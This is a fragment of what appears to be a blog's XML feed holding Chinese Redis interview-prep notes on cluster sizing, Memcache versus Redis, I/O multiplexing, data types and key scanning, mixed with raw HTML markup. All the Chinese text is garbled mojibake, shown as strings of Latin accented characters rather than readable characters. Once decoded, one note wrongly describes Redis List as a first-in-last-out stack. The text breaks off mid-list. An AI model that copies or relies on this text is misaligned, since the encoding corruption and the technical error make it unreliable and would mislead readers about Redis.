æ˜¯ä¸»ä»æ¶æ„ï¼Ÿé›†ç¾¤æ¶æ„ï¼Ÿç”¨äº†å“ªç§é›†ç¾¤æ–¹æ¡ˆï¼Ÿæœ‰æ²¡æœ‰åšé«˜å¯ç”¨ä¿è¯ï¼Ÿæœ‰æ²¡æœ‰å¼€å¯æŒä¹…åŒ–æœºåˆ¶ç¡®ä¿å¯ä»¥è¿›è¡Œæ•°æ®æ¢å¤ï¼Ÿçº¿ä¸Š redis ç»™å‡ ä¸ª G çš„å†…å­˜ï¼Ÿè®¾ç½®äº†å“ªäº›å‚æ•°ï¼Ÿå‹æµ‹åä½ ä»¬ redis é›†ç¾¤æ‰¿è½½å¤šå°‘ QPSï¼Ÿ</p><p>å…„å¼Ÿï¼Œè¿™äº›ä½ å¿…é¡»æ˜¯é—¨å„¿æ¸…çš„ï¼Œå¦åˆ™ä½ ç¡®å®æ˜¯æ²¡å¥½å¥½æ€è€ƒè¿‡ã€‚</p><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><p>redis clusterï¼Œ10 å°æœºå™¨ï¼Œ5 å°æœºå™¨éƒ¨ç½²äº† redis ä¸»å®ä¾‹ï¼Œå¦å¤– 5 å°æœºå™¨éƒ¨ç½²äº† redis çš„ä»å®ä¾‹ï¼Œæ¯ä¸ªä¸»å®ä¾‹æŒ‚äº†ä¸€ä¸ªä»å®ä¾‹ï¼Œ5 ä¸ªèŠ‚ç‚¹å¯¹å¤–æä¾›è¯»å†™æœåŠ¡ï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„è¯»å†™é«˜å³°qpså¯èƒ½å¯ä»¥è¾¾åˆ°æ¯ç§’ 5 ä¸‡ï¼Œ5 å°æœºå™¨æœ€å¤šæ˜¯ 25 ä¸‡è¯»å†™è¯·æ±‚&#x2F;sã€‚</p><p>æœºå™¨æ˜¯ä»€ä¹ˆé…ç½®ï¼Ÿ32G å†…å­˜+ 8 æ ¸ CPU + 1T ç£ç›˜ï¼Œä½†æ˜¯åˆ†é…ç»™ redis è¿›ç¨‹çš„æ˜¯10gå†…å­˜ï¼Œä¸€èˆ¬çº¿ä¸Šç”Ÿäº§ç¯å¢ƒï¼Œredis çš„å†…å­˜å°½é‡ä¸è¦è¶…è¿‡ 10gï¼Œè¶…è¿‡ 10g å¯èƒ½ä¼šæœ‰é—®é¢˜ã€‚</p><p>5 å°æœºå™¨å¯¹å¤–æä¾›è¯»å†™ï¼Œä¸€å…±æœ‰ 50g å†…å­˜ã€‚</p><p>å› ä¸ºæ¯ä¸ªä¸»å®ä¾‹éƒ½æŒ‚äº†ä¸€ä¸ªä»å®ä¾‹ï¼Œæ‰€ä»¥æ˜¯é«˜å¯ç”¨çš„ï¼Œä»»ä½•ä¸€ä¸ªä¸»å®ä¾‹å®•æœºï¼Œéƒ½ä¼šè‡ªåŠ¨æ•…éšœè¿ç§»ï¼Œredis ä»å®ä¾‹ä¼šè‡ªåŠ¨å˜æˆä¸»å®ä¾‹ç»§ç»­æä¾›è¯»å†™æœåŠ¡ã€‚</p><p>ä½ å¾€å†…å­˜é‡Œå†™çš„æ˜¯ä»€ä¹ˆæ•°æ®ï¼Ÿæ¯æ¡æ•°æ®çš„å¤§å°æ˜¯å¤šå°‘ï¼Ÿå•†å“æ•°æ®ï¼Œæ¯æ¡æ•°æ®æ˜¯ 10kbã€‚100 æ¡æ•°æ®æ˜¯ 1mbï¼Œ10 ä¸‡æ¡æ•°æ®æ˜¯ 1gã€‚å¸¸é©»å†…å­˜çš„æ˜¯ 200 ä¸‡æ¡å•†å“æ•°æ®ï¼Œå ç”¨å†…å­˜æ˜¯ 20gï¼Œä»…ä»…ä¸åˆ°æ€»å†…å­˜çš„ 50%ã€‚ç›®å‰é«˜å³°æœŸæ¯ç§’å°±æ˜¯ 3500 å·¦å³çš„è¯·æ±‚é‡ã€‚</p><p>å…¶å®å¤§å‹çš„å…¬å¸ï¼Œä¼šæœ‰åŸºç¡€æ¶æ„çš„ team è´Ÿè´£ç¼“å­˜é›†ç¾¤çš„è¿ç»´ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedisåŸºç¡€çŸ¥è¯†ç‚¹</title>
      <link href="/2020/03/25/redis/"/>
      <url>/2020/03/25/redis/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç›˜ç‚¹äº†å¸¸è€ƒçš„RedisåŸºç¡€çŸ¥è¯†ç‚¹</p><span id="more"></span><!-- toc --><ul><li><a href="#%E7%BC%93%E5%AD%98%E4%B8%AD%E9%97%B4%E4%BB%B6memcache%E5%92%8Credis%E7%9A%84%E5%8C%BA%E5%88%AB">ç¼“å­˜ä¸­é—´ä»¶â€”â€”Memcacheå’ŒRedisçš„åŒºåˆ« âˆš</a><ul><li><a href="#memcache%E4%BB%A3%E7%A0%81%E5%B1%82%E6%AC%A1%E7%B1%BB%E4%BC%BChash">Memcacheï¼šä»£ç å±‚æ¬¡ç±»ä¼¼Hash</a></li><li><a href="#redis">Redis</a></li></ul></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88redis%E8%83%BD%E9%82%A3%E4%B9%88%E5%BF%AB">ä¸ºä»€ä¹ˆRedisèƒ½é‚£ä¹ˆå¿« âˆš</a><ul><li><a href="#100000qpsqps%E5%8D%B3query-per-second%E6%AF%8F%E7%A7%92%E6%9F%A5%E8%AF%A2%E6%AC%A1%E6%95%B0">100000+QPSï¼ˆQPSå³query per secondï¼Œæ¯ç§’æŸ¥è¯¢æ¬¡æ•°ï¼‰</a></li><li><a href="#%E5%A4%9A%E8%B7%AFio%E5%A4%8D%E7%94%A8%E6%A8%A1%E5%9E%8B">å¤šè·¯I&#x2F;Oå¤ç”¨æ¨¡å‹</a><ul><li><a href="#fdfile-descriptor%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6">FDï¼šFile Descriptorï¼Œæ–‡ä»¶æè¿°ç¬¦</a></li><li><a href="#%E4%BC%A0%E7%BB%9F%E7%9A%84%E9%98%BB%E5%A1%9Eio%E6%A8%A1%E5%9E%8B">ä¼ ç»Ÿçš„é˜»å¡I&#x2F;Oæ¨¡å‹</a></li><li><a href="#select%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">Selectç³»ç»Ÿè°ƒç”¨</a></li><li><a href="#redis%E9%87%87%E7%94%A8%E7%9A%84io%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E5%87%BD%E6%95%B0epollkqueueevportselect">Redisé‡‡ç”¨çš„I&#x2F;Oå¤šè·¯å¤ç”¨å‡½æ•°ï¼šepoll&#x2F;kqueue&#x2F;evport&#x2F;select</a></li></ul></li></ul></li><li><a href="#redis%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">Redisæ•°æ®ç±»å‹ï¼šâˆš</a><ul><li><a href="#%E4%BE%9B%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">ä¾›ç”¨æˆ·ä½¿ç”¨çš„æ•°æ®ç±»å‹</a></li><li><a href="#%E5%BA%95%E5%B1%82%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3">åº•å±‚æ•°æ®ç±»å‹åŸºç¡€ï¼ˆäº†è§£ï¼‰</a></li></ul></li><li><a href="#%E4%BB%8E%E6%B5%B7%E9%87%8F%E6%95%B0%E6%8D%AE%E9%87%8C%E6%9F%A5%E8%AF%A2%E6%9F%90%E4%B8%80%E5%9B%BA%E5%AE%9A%E5%89%8D%E7%BC%80%E7%9A%84key">ä»æµ·é‡æ•°æ®é‡ŒæŸ¥è¯¢æŸä¸€å›ºå®šå‰ç¼€çš„key âˆš</a><ul><li><a href="#%E4%BD%BF%E7%94%A8keys%E5%AF%B9%E7%BA%BF%E4%B8%8A%E7%9A%84%E4%B8%9A%E5%8A%A1%E7%9A%84%E5%BD%B1%E5%93%8D">ä½¿ç”¨keyså¯¹çº¿ä¸Šçš„ä¸šåŠ¡çš„å½±å“ âˆš</a><ul><li><a href="#keys-pattern%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E7%AC%A6%E5%90%88%E7%BB%99%E5%AE%9A%E6%A8%A1%E5%BC%8Fpattern%E7%9A%84key">KEYS patternï¼šæŸ¥æ‰¾æ‰€æœ‰ç¬¦åˆç»™å®šæ¨¡å¼patternçš„key</a></li></ul></li><li><a href="#%E4%BB%8E%E6%B5%B7%E9%87%8Fkey%E9%87%8C%E6%9F%A5%E8%AF%A2%E5%87%BA%E6%9F%90%E4%B8%80%E5%9B%BA%E5%AE%9A%E5%89%8D%E7%BC%80%E7%9A%84key">ä»æµ·é‡Keyé‡ŒæŸ¥è¯¢å‡ºæŸä¸€å›ºå®šå‰ç¼€çš„Key âˆš</a></li></ul></li><li><a href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87redis%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81">å¦‚ä½•é€šè¿‡Rediså®ç°åˆ†å¸ƒå¼é”</a><ul><li><a href="#%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E9%9C%80%E8%A6%81%E8%A7%A3%E5%86%B3%E7%9A%84%E9%97%AE%E9%A2%98">åˆ†å¸ƒå¼é”éœ€è¦è§£å†³çš„é—®é¢˜ Ã—</a></li><li><a href="#setnx-key-value-%E5%A6%82%E6%9E%9Ckey%E4%B8%8D%E5%AD%98%E5%9C%A8%E5%88%99%E5%88%9B%E5%BB%BA%E5%B9%B6%E8%B5%8B%E5%80%BC">SETNX key value: å¦‚æœkeyä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºå¹¶èµ‹å€¼ âˆš</a></li><li><a href="#set-key-value-ex-seconds-px-milliseconds-nxxx">SET key value [EX seconds] [PX milliseconds] [NX|XX] âˆš</a></li><li><a href="#%E5%A4%A7%E9%87%8Fkey%E5%90%8C%E6%97%B6%E8%BF%87%E6%9C%9F%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9">å¤§é‡keyåŒæ—¶è¿‡æœŸçš„æ³¨æ„äº‹é¡¹</a><ul><li><a href="#%E9%9B%86%E4%B8%AD%E8%BF%87%E6%9C%9F%E7%94%B1%E4%BA%8E%E6%B8%85%E9%99%A4%E5%A4%A7%E9%87%8Fkey%E5%BE%88%E8%80%97%E6%97%B6%E4%BC%9A%E5%87%BA%E7%8E%B0%E7%9F%AD%E6%9A%82%E5%8D%A1%E9%A1%BF%E7%8E%B0%E8%B1%A1">é›†ä¸­è¿‡æœŸï¼Œç”±äºæ¸…é™¤å¤§é‡keyå¾ˆè€—æ—¶ï¼Œä¼šå‡ºç°çŸ­æš‚å¡é¡¿ç°è±¡ âˆš</a></li></ul></li><li><a href="#%E4%BD%BF%E7%94%A8list%E4%BD%9C%E4%B8%BA%E9%98%9F%E5%88%97rpush%E7%94%9F%E4%BA%A7%E6%B6%88%E6%81%AFlpop%E6%B6%88%E8%B4%B9%E6%B6%88%E6%81%AF">ä½¿ç”¨Listä½œä¸ºé˜Ÿåˆ—ï¼ŒRPUSHç”Ÿäº§æ¶ˆæ¯ï¼ŒLPOPæ¶ˆè´¹æ¶ˆæ¯ âˆš</a></li><li><a href="#blpop-key-key-timeout-%E9%98%BB%E5%A1%9E%E7%9B%B4%E5%88%B0%E9%98%9F%E5%88%97%E6%9C%89%E6%B6%88%E6%81%AF%E6%88%96%E8%80%85%E8%B6%85%E6%97%B6">BLPOP key [key â€¦] timeout: é˜»å¡ç›´åˆ°é˜Ÿåˆ—æœ‰æ¶ˆæ¯æˆ–è€…è¶…æ—¶ âˆš</a></li><li><a href="#pubsub-%E4%B8%BB%E9%A2%98%E8%AE%A2%E9%98%85%E8%80%85%E6%A8%A1%E5%BC%8F">pub&#x2F;sub: ä¸»é¢˜è®¢é˜…è€…æ¨¡å¼ âˆš</a><ul><li><a href="#pubsub%E7%9A%84%E7%BC%BA%E7%82%B9">pub&#x2F;subçš„ç¼ºç‚¹ âˆš</a></li></ul></li></ul></li><li><a href="#redis%E5%A6%82%E4%BD%95%E6%8C%81%E4%B9%85%E5%8C%96">Rediså¦‚ä½•æŒä¹…åŒ–</a><ul><li><a href="#rdb%E5%BF%AB%E7%85%A7%E6%8C%81%E4%B9%85%E5%8C%96%E4%BF%9D%E5%AD%98%E6%9F%90%E4%B8%AA%E6%97%B6%E9%97%B4%E7%82%B9%E7%9A%84%E5%85%A8%E9%87%8F%E6%95%B0%E6%8D%AE%E5%BF%AB%E7%85%A7">Rdbï¼ˆå¿«ç…§ï¼‰æŒä¹…åŒ–ï¼šä¿å­˜æŸä¸ªæ—¶é—´ç‚¹çš„å…¨é‡æ•°æ®å¿«ç…§</a><ul><li><a href="#rdb%E5%BF%AB%E7%85%A7%E6%8C%81%E4%B9%85%E5%8C%96%E4%BF%9D%E5%AD%98%E6%9F%90%E4%B8%AA%E6%97%B6%E9%97%B4%E7%82%B9%E7%9A%84%E5%85%A8%E9%87%8F%E6%95%B0%E6%8D%AE%E5%BF%AB%E7%85%A7">RDBï¼ˆå¿«ç…§ï¼‰æŒä¹…åŒ–ï¼šä¿å­˜æŸä¸ªæ—¶é—´ç‚¹çš„å…¨é‡æ•°æ®å¿«ç…§</a></li><li><a href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%A6%E5%8F%91rdb%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E6%96%B9%E5%BC%8F">è‡ªåŠ¨åŒ–è§¦å‘RDBæŒä¹…åŒ–çš„æ–¹å¼ Ã—</a></li><li><a href="#copy-on-write">Copy-on-Write</a></li><li><a href="#rdb%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E7%BC%BA%E7%82%B9">RDBæŒä¹…åŒ–çš„ç¼ºç‚¹ âˆš</a></li></ul></li><li><a href="#aofappend-only-file%E6%8C%81%E4%B9%85%E5%8C%96%E4%BF%9D%E6%8C%81%E5%86%99%E7%8A%B6%E6%80%81">AOFï¼ˆAppend-Only-Fileï¼‰æŒä¹…åŒ–ï¼šä¿æŒå†™çŠ¶æ€</a><ul><li><a href="#%E6%97%A5%E5%BF%97%E9%87%8D%E5%86%99%E8%A7%A3%E5%86%B3aof%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E4%B8%8D%E6%96%AD%E5%A2%9E%E5%A4%A7%E7%9A%84%E9%97%AE%E9%A2%98%E5%8E%9F%E7%90%86%E5%A6%82%E4%B8%8B-">æ—¥å¿—é‡å†™è§£å†³AOFæ–‡ä»¶å¤§å°ä¸æ–­å¢å¤§çš„é—®é¢˜ï¼ŒåŸç†å¦‚ä¸‹ -</a></li></ul></li><li><a href="#redis%E6%95%B0%E6%8D%AE%E7%9A%84%E6%81%A2%E5%A4%8D">Redisæ•°æ®çš„æ¢å¤</a><ul><li><a href="#rdb%E5%92%8Caof%E6%96%87%E4%BB%B6%E5%85%B1%E5%AD%98%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E6%81%A2%E5%A4%8D%E6%B5%81%E7%A8%8B">RDBå’ŒAOFæ–‡ä»¶å…±å­˜æƒ…å†µä¸‹çš„æ¢å¤æµç¨‹ âˆš</a></li><li><a href="#rdb%E5%92%8Caof%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9">RDBå’ŒAOFçš„ä¼˜ç¼ºç‚¹ âˆš</a></li><li><a href="#rdb-aof%E6%B7%B7%E5%90%88%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E6%96%B9%E5%BC%8F-">RDB-AOFæ··åˆæŒä¹…åŒ–çš„æ–¹å¼ -</a><ul><li><a href="#%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD">æ•°æ®å¤‡ä»½</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D">æ•°æ®æ¢å¤</a></li></ul></li><li><a href="#%E4%BD%BF%E7%94%A8pipline%E7%9A%84%E5%A5%BD%E5%A4%84-">ä½¿ç”¨Piplineçš„å¥½å¤„ -</a></li></ul></li><li><a href="#redis%E7%9A%84%E5%90%8C%E6%AD%A5%E6%9C%BA%E5%88%B6">Redisçš„åŒæ­¥æœºåˆ¶</a><ul><li><a href="#%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E5%8E%9F%E7%90%86">ä¸»ä»åŒæ­¥åŸç†</a><ul><li><a href="#%E5%85%A8%E5%90%8C%E6%AD%A5%E6%B5%81%E7%A8%8B">å…¨åŒæ­¥æµç¨‹ï¼š</a></li><li><a href="#%E5%A2%9E%E9%87%8F%E5%90%8C%E6%AD%A5%E8%BF%87%E7%A8%8B">å¢é‡åŒæ­¥è¿‡ç¨‹</a></li></ul></li><li><a href="#%E5%93%A8%E5%85%B5%E5%90%8C%E6%AD%A5redis-sentinel">å“¨å…µåŒæ­¥Redis Sentinel</a><ul><li><a href="#%E6%B5%81%E8%A8%80%E5%8D%8F%E8%AE%AEgossip">æµè¨€åè®®Gossip</a></li></ul></li></ul></li></ul></li><li><a href="#redis%E7%9A%84%E9%9B%86%E7%BE%A4%E5%8E%9F%E7%90%86">Redisçš„é›†ç¾¤åŸç†</a></li><li><a href="#%E9%9B%86%E7%BE%A4%E5%8F%AF%E7%94%A8%E6%80%A7">é›†ç¾¤å¯ç”¨æ€§</a><ul><li><a href="#%E5%A6%82%E4%BD%95%E4%BB%8E%E6%B5%B7%E9%87%8F%E6%95%B0%E6%8D%AE%E9%87%8C%E5%BF%AB%E9%80%9F%E6%89%BE%E5%88%B0%E6%89%80%E9%9C%80">å¦‚ä½•ä»æµ·é‡æ•°æ®é‡Œå¿«é€Ÿæ‰¾åˆ°æ‰€éœ€ï¼Ÿ</a></li><li><a href="#%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95%E5%AF%B9232%E5%8F%96%E6%A8%A1%E5%B0%86%E5%93%88%E5%B8%8C%E5%80%BC%E7%A9%BA%E9%97%B4%E7%BB%84%E7%BB%87%E6%88%90%E8%99%9A%E6%8B%9F%E7%9A%84%E5%9C%86%E7%8E%AF">ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ï¼šå¯¹2^32å–æ¨¡ï¼Œå°†å“ˆå¸Œå€¼ç©ºé—´ç»„ç»‡æˆè™šæ‹Ÿçš„åœ†ç¯</a></li><li><a href="#%E5%B0%86%E6%95%B0%E6%8D%AEkey%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%90%8C%E7%9A%84%E5%87%BD%E6%95%B0hash%E8%AE%A1%E7%AE%97%E5%87%BA%E5%93%88%E5%B8%8C%E5%80%BC">å°†æ•°æ®keyä½¿ç”¨ç›¸åŒçš„å‡½æ•°Hashè®¡ç®—å‡ºå“ˆå¸Œå€¼</a></li><li><a href="#%E6%96%B0%E5%A2%9E%E6%9C%8D%E5%8A%A1%E5%99%A8node-x">æ–°å¢æœåŠ¡å™¨Node X</a></li><li><a href="#hash%E7%8E%AF%E7%9A%84%E6%95%B0%E6%8D%AE%E5%80%BE%E6%96%9C%E9%97%AE%E9%A2%98">Hashç¯çš„æ•°æ®å€¾æ–œé—®é¢˜</a></li><li><a href="#%E5%BC%95%E5%85%A5%E8%99%9A%E6%8B%9F%E8%8A%82%E7%82%B9%E8%A7%A3%E5%86%B3%E6%95%B0%E6%8D%AE%E5%80%BE%E6%96%9C%E7%9A%84%E9%97%AE%E9%A2%98">å¼•å…¥è™šæ‹ŸèŠ‚ç‚¹è§£å†³æ•°æ®å€¾æ–œçš„é—®é¢˜</a></li></ul></li></ul><!-- tocstop --><p><img src="/2020/03/25/redis/image-20200325150748001.png"></p><h2><span id="ç¼“å­˜ä¸­é—´ä»¶memcacheå’Œredisçš„åŒºåˆ«">ç¼“å­˜ä¸­é—´ä»¶â€”â€”Memcacheå’ŒRedisçš„åŒºåˆ« âˆš</span></h2><h3><span id="memcacheä»£ç å±‚æ¬¡ç±»ä¼¼hash">Memcacheï¼šä»£ç å±‚æ¬¡ç±»ä¼¼Hash</span></h3><p>Ã˜ æ”¯æŒç®€å•æ•°æ®ç±»å‹</p><p>Ã˜ ä¸æ”¯æŒæ•°æ®æŒä¹…åŒ–å­˜å‚¨</p><p>Ã˜ ä¸æ”¯æŒä¸»ä»</p><p>Ã˜ ä¸æ”¯æŒåˆ†ç‰‡</p><h3><span id="redis">Redis</span></h3><p>Ã˜ æ•°æ®ç±»å‹ä¸°å¯Œ</p><p>Ã˜ æ”¯æŒæ•°æ®ç£ç›˜æŒä¹…åŒ–å­˜å‚¨</p><p>Ã˜ æ”¯æŒä¸»ä»</p><p>Ã˜ æ”¯æŒåˆ†ç‰‡</p><h2><span id="ä¸ºä»€ä¹ˆredisèƒ½é‚£ä¹ˆå¿«">ä¸ºä»€ä¹ˆRedisèƒ½é‚£ä¹ˆå¿« âˆš</span></h2><h3><span id="100000qpsqpså³query-per-secondæ¯ç§’æŸ¥è¯¢æ¬¡æ•°">100000+QPSï¼ˆQPSå³query per secondï¼Œæ¯ç§’æŸ¥è¯¢æ¬¡æ•°ï¼‰</span></h3><p>Ã˜ å®Œå…¨åŸºäºå†…å­˜ï¼Œç»å¤§éƒ¨åˆ†è¯·æ±‚æ˜¯çº¯ç²¹çš„å†…å­˜æ“ä½œï¼Œæ‰§è¡Œæ•ˆç‡é«˜</p><p>Ã˜ æ•°æ®ç»“æ„ç®€å•ï¼Œå¯¹æ•°æ®æ“ä½œä¹Ÿç®€å•</p><p>Ã˜ é‡‡ç”¨å•çº¿ç¨‹ï¼Œä¸ä¼šæœ‰ä¸Šä¸‹æ–‡åˆ‡æ¢å¼€é”€ï¼Œä¸ç”¨å»è€ƒè™‘å„ç§é”çš„é—®é¢˜ï¼Œä¸å­˜åœ¨åŠ é”é‡Šæ”¾é”æ“ä½œï¼Œæ²¡æœ‰å› ä¸ºå¯èƒ½å‡ºç°æ­»é”è€Œå¯¼è‡´çš„æ€§èƒ½æ¶ˆè€—ï¼›</p><p>Ã˜ ä½¿ç”¨å¤šè·¯I&#x2F;Oå¤ç”¨æ¨¡å‹ï¼Œéé˜»å¡IO</p><h3><span id="å¤šè·¯ix2foå¤ç”¨æ¨¡å‹">å¤šè·¯I&#x2F;Oå¤ç”¨æ¨¡å‹</span></h3><h4><span id="fdfile-descriptoræ–‡ä»¶æè¿°ç¬¦">FDï¼šFile Descriptorï¼Œæ–‡ä»¶æè¿°ç¬¦</span></h4><p>ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶é€šè¿‡å”¯ä¸€çš„æè¿°ç¬¦è¿›è¡Œå¼•ç”¨ï¼Œè¯¥æè¿°ç¬¦æ˜¯æ‰“å¼€æ–‡ä»¶çš„å…ƒæ•°æ®åˆ°æ–‡ä»¶æœ¬èº«çš„æ˜ å°„ </p><h4><span id="ä¼ ç»Ÿçš„é˜»å¡ix2foæ¨¡å‹">ä¼ ç»Ÿçš„é˜»å¡I&#x2F;Oæ¨¡å‹</span></h4><p>   <img src="/2020/03/25/redis/image-20200325150854778.png" alt="BIO"></p><h4><span id="selectç³»ç»Ÿè°ƒç”¨">Selectç³»ç»Ÿè°ƒç”¨</span></h4><p> <img src="/2020/03/25/redis/image-20200325150908349.png"></p><p>SelectoråŒæ—¶ç›‘æ§å¤šä¸ªFDçš„å¯è¯»å¯å†™æƒ…å†µï¼Œè¿”å›å¯è¯»å¯å†™FDä¸ªæ•° </p><p>å¯è¾¾åˆ°åœ¨<font color="red">åŒä¸€ä¸ªçº¿ç¨‹å†…åŒæ—¶å¤„ç†å¤šä¸ªI&#x2F;Oè¯·æ±‚çš„ç›®çš„</font>ã€‚è€Œåœ¨åŒæ­¥é˜»å¡æ¨¡å‹ä¸­ï¼Œå¿…é¡»é€šè¿‡å¤šçº¿ç¨‹çš„æ–¹å¼æ‰èƒ½è¾¾åˆ°è¿™ä¸ªç›®çš„ã€‚</p><h4><span id="redisé‡‡ç”¨çš„ix2foå¤šè·¯å¤ç”¨å‡½æ•°epollx2fkqueuex2fevportx2fselect">Redisé‡‡ç”¨çš„I&#x2F;Oå¤šè·¯å¤ç”¨å‡½æ•°ï¼šepoll&#x2F;kqueue&#x2F;evport&#x2F;select</span></h4><p>Ã˜ å› åœ°åˆ¶å®œ</p><p>Ã˜ ä¼˜å…ˆé€‰æ‹©æ—¶é—´å¤æ‚åº¦ä¸ºO(1)çš„I&#x2F;Oå¤šè·¯å¤ç”¨å‡½æ•°ä½œä¸ºåº•å±‚å®ç°</p><p>Ã˜ ä»¥æ—¶é—´å¤æ‚åº¦ä¸ºO(n)çš„selectä½œä¸ºä¿åº•</p><p>Ã˜è¯·æ±‚&#x2F;å“åº”æ¨¡å‹ç›‘å¬I&#x2F;Oäº‹ä»¶</p><h2><span id="redisæ•°æ®ç±»å‹">Redisæ•°æ®ç±»å‹ï¼šâˆš</span></h2><h3><span id="ä¾›ç”¨æˆ·ä½¿ç”¨çš„æ•°æ®ç±»å‹">ä¾›ç”¨æˆ·ä½¿ç”¨çš„æ•°æ®ç±»å‹</span></h3><p>Ã˜ Stringï¼šæœ€åŸºæœ¬çš„æ•°æ®ç±»å‹ï¼ŒäºŒè¿›åˆ¶å®‰å…¨ </p><p><strong>äºŒè¿›åˆ¶æŒ‡çš„æ˜¯å¯ä»¥æ˜¯å›¾ç‰‡æˆ–è€…åºåˆ—åŒ–å¯¹è±¡ï¼Œç­‰ç­‰äºŒè¿›åˆ¶è¡¨ç¤ºçš„æ–‡ä»¶ï¼Œæœ€å¤š512Mã€‚</strong></p><p>Ã˜ Hashï¼šStringå…ƒç´ ç»„æˆçš„å­—å…¸ï¼Œé€‚åˆç”¨äºå­˜å‚¨å¯¹è±¡</p><p>Ã˜ Listï¼šåˆ—è¡¨ï¼ŒæŒ‰ç…§Stringå…ƒç´ æ’å…¥é¡ºåºæ’åº</p><p><strong>Listæ˜¯Stackç»“æ„çš„ å…ˆå…¥åå‡º</strong> </p><p>Ã˜ Setï¼šStringå…ƒç´ ç»„æˆçš„æ— åºé›†åˆï¼Œé€šè¿‡å“ˆå¸Œè¡¨å®ç°ï¼Œä¸å…è®¸é‡å¤ï¼ˆæ•´æ•°é›†åˆæˆ–å­—å…¸ï¼‰</p><p>Ã˜ Sorted Setï¼šé€šè¿‡åˆ†æ•°æ¥ä¸ºé›†åˆä¸­çš„æˆå‘˜è¿›è¡Œä»å°åˆ°å¤§çš„æ’åº (å‹ç¼©åˆ—è¡¨æˆ–è·³è¡¨)</p><p><strong>åˆ†æ•°é‡å¤ å€¼ä¸åŒæ²¡æœ‰é—®é¢˜</strong></p><h3><span id="åº•å±‚æ•°æ®ç±»å‹åŸºç¡€äº†è§£">åº•å±‚æ•°æ®ç±»å‹åŸºç¡€ï¼ˆäº†è§£ï¼‰</span></h3><ol><li><p>ç®€å•åŠ¨æ€å­—ç¬¦ä¸²</p></li><li><p>é“¾è¡¨</p></li><li><p>å­—å…¸</p></li><li><p>è·³è·ƒè¡¨</p></li><li><p>æ•´æ•°é›†åˆ</p></li><li><p>å‹ç¼©åˆ—è¡¨</p></li><li><p>å¯¹è±¡</p></li></ol><h2><span id="ä»æµ·é‡æ•°æ®é‡ŒæŸ¥è¯¢æŸä¸€å›ºå®šå‰ç¼€çš„key">ä»æµ·é‡æ•°æ®é‡ŒæŸ¥è¯¢æŸä¸€å›ºå®šå‰ç¼€çš„key âˆš</span></h2><p><strong>ç•™æ„ç»†èŠ‚</strong></p><p>Ã˜ æ‘¸æ¸…æ•°æ®è§„æ¨¡ï¼Œå³é—®æ¸…æ¥šè¾¹ç•Œ</p><h3><span id="ä½¿ç”¨keyså¯¹çº¿ä¸Šçš„ä¸šåŠ¡çš„å½±å“">ä½¿ç”¨keyså¯¹çº¿ä¸Šçš„ä¸šåŠ¡çš„å½±å“ âˆš</span></h3><h4><span id="keys-patternæŸ¥æ‰¾æ‰€æœ‰ç¬¦åˆç»™å®šæ¨¡å¼patternçš„key">KEYS patternï¼šæŸ¥æ‰¾æ‰€æœ‰ç¬¦åˆç»™å®šæ¨¡å¼patternçš„key</span></h4><p>Ã˜ KEYSæŒ‡ä»¤ä¸€æ¬¡æ€§è¿”å›æ‰€æœ‰åŒ¹é…çš„key</p><p>Ã˜ é”®çš„æ•°é‡è¿‡å¤§ä¼šä½¿æœåŠ¡å¡é¡¿</p><h3><span id="ä»æµ·é‡keyé‡ŒæŸ¥è¯¢å‡ºæŸä¸€å›ºå®šå‰ç¼€çš„key">ä»æµ·é‡Keyé‡ŒæŸ¥è¯¢å‡ºæŸä¸€å›ºå®šå‰ç¼€çš„Key âˆš</span></h3><p><strong>SCAN cursor [MATCH pattern] [COUNT count]</strong></p><p>Ã˜ åŸºäºæ¸¸æ ‡çš„è¿­ä»£å™¨ï¼Œéœ€è¦åŸºäºä¸Šä¸€æ¬¡çš„æ¸¸æ ‡å»¶ç»­ä¹‹å‰çš„è¿­ä»£è¿‡ç¨‹</p><p>Ã˜ ä»¥0ä½œä¸ºæ¸¸æ ‡å¼€å§‹ä¸€æ¬¡æ–°çš„è¿­ä»£ï¼Œç›´åˆ°å‘½ä»¤è¿”å›æ¸¸æ ‡0å®Œæˆä¸€æ¬¡éå†</p><p>Ã˜ 